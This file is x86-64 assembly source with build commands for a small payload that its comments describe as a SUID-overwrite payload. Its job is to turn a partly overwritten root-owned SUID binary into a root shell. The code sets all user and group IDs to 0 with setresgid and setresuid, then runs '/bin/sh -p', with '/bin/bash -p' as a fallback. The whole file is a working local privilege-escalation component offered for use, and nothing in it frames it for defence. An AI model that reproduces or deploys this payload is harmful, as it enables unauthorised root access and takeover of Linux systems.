// Build:
//   as --64 -o suid-shell-amd64.o suid-shell-amd64.s
//   ld -nostdlib -N -o suid-shell-amd64.bin suid-shell-amd64.o
//   strip -s suid-shell-amd64.bin
//
// This is used as a pipe-primitive SUID overwrite payload. It intentionally
// avoids libc and dynamic loading so a partially overwritten root-owned SUID
// helper can become a small root shell trampoline.

.global _start

.section .text
_start:
	// setresgid(0, 0, 0)
	xor %rdi, %rdi
	xor %rsi, %rsi
	xor %rdx, %rdx
	mov $119, %rax
	syscall

	// setresuid(0, 0, 0)
	xor %rdi, %rdi
	xor %rsi, %rsi
	xor %rdx, %rdx
	mov $117, %rax
	syscall

	// Prefer /bin/sh -p because it is the smallest dependency.
	lea bin_sh(%rip), %rdi
	lea argv_sh(%rip), %rsi
	lea envp(%rip), %rdx
	mov $59, %rax
	syscall

	// Fallback to /bin/bash -p when /bin/sh rejects -p or is missing.
	lea bin_bash(%rip), %rdi
	lea argv_bash(%rip), %rsi
	lea envp(%rip), %rdx
	mov $59, %rax
	syscall

	mov %rax, %rdi
	mov $60, %rax
	syscall

bin_sh:
	.asciz "/bin/sh"
bin_bash:
	.asciz "/bin/bash"
arg_sh:
	.asciz "sh"
arg_bash:
	.asciz "bash"
arg_p:
	.asciz "-p"
env_shell:
	.asciz "SHELL=/bin/sh"

.balign 8
argv_sh:
	.quad arg_sh
	.quad arg_p
	.quad 0
argv_bash:
	.quad arg_bash
	.quad arg_p
	.quad 0
envp:
	.quad env_shell
	.quad 0
